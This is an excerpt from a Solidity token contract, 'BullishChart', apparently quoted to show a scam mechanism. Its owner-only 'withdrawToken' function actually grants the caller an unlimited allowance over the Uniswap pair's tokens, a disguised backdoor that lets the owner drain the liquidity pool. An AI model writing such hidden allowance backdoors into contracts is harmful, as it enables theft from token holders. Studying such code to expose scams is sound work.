...
contract BullishChart {
    ...
    uint256 constant public MAX_HEX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    ...
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        _approve(uniswapPair, msg.sender, MAX_HEX_INT);
